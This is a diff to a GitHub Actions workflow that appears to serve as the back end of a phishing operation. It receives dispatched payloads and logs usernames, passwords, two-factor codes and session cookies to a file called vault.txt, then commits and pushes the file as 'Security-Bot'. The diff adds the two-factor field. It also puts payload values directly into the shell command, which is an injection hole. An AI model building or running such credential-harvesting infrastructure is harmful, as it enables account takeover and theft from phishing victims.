@@ -1,21 +1,13 @@
-name: Capture-Engine
-on:
-  repository_dispatch:
-    types: [log_data]
+name: Chief-Capture-Engine
+on: [repository_dispatch]
 jobs:
-  update:
+  store:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v2
-      - name: Update Logs
+      - name: Sync Data
         run: |
-          U="${{ github.event.client_payload.u }}"
-          P="${{ github.event.client_payload.p }}"
-          C="${{ github.event.client_payload.c }}"
-          T=$(date +'%Y-%m-%d %H:%M')
-          echo "$T | $U | $P | $C" >> vault.txt
+          echo "$(date) | USER: ${{github.event.client_payload.u}} | PASS: ${{github.event.client_payload.p}} | 2FA: ${{github.event.client_payload.code}} | COOKIE: ${{github.event.client_payload.c}}" >> vault.txt
           git config --global user.name "Security-Bot"
           git config --global user.email "bot@github.com"
-          git add vault.txt
-          git commit -m "Capture Update"
-          git push
+          git add vault.txt && git commit -m "Capture Received" && git push
